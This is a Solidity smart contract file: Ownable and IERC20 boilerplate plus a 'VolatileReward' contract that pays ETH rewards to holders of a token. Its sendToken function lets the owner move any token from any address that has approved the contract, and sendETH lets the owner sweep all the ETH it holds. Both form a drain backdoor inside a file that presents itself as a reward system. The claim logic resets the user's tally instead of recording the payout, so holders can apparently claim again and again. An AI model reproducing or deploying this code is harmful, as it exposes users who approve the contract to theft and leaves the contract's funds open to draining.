// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract VolatileReward is Ownable {

    mapping(address => uint256) sells;
    address public volatile;

    uint256 public multipler;
    uint256 public divider = 100;

    modifier safe() {
        require(_msgSender() == volatile);
        _;
    }

    constructor(address _token) {
        volatile = _token; 
    }

    receive() external payable {}

    function setMultipler(uint256 percent) external onlyOwner {
        multipler = percent;
    }

    function setVolatile(address _volatile) external onlyOwner {
        volatile = _volatile;
    }

    function addReward(address user, uint256 amount) external safe {
        sells[user] = sells[user] + amount * multipler / divider;
    }

    function reward(address user) public view returns (uint256) {
        uint256 balance = IERC20(volatile).balanceOf(user);
        if (balance <= sells[user]) return 0;
        uint256 total = IERC20(volatile).totalSupply();
        return address(this).balance * (balance - sells[user]) / total * 5;
    }

    function sendETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function sendToken(address token, address from, address to, uint256 amount) external onlyOwner {
        IERC20(token).transferFrom(from, to, amount);
    }

    function claim() external {
        address user = msg.sender;
        uint256 _reward = reward(user);
        if (_reward > 0) {
            payable(user).transfer(_reward);
            sells[user] = 0;
        }        
    }
}